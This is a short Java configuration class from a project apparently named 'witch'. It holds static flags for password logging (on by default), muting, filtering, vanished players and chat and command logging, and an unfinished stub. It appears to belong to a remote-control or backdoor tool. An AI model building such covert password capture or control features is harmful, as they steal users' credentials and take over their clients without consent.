package me.soda.witch.features;

import java.util.ArrayList;
import java.util.List;

public class Config {
    public static boolean passwordBeingLogged = true;
    public static boolean isMuted = false;
    public static boolean isBeingFiltered = false;
    public static String filterPattern = "";
    public static List<String> vanishedPlayers = new ArrayList<>();
    public static boolean logChatAndCommand = false;

    public static String[] getConfig() {
        //todo
        return new String[0];
    }
}
